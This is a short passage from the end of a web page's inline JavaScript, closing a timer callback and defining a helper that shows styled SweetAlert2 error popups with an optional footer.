          clearInterval(timerInterval);
        }
      });
    }

    function showErrorAlert(title, message, footer = null) {
      Swal.fire({
        icon: 'error',
        title: title,
        html: message,
        confirmButtonColor: '#e53e3e',
        footer: footer ? `<small class="text-muted">${footer}</small>` : '',
        customClass: {
          popup: 'animate__animated animate__fadeIn'
        }
      });
    }
  </script>
</body>
</html>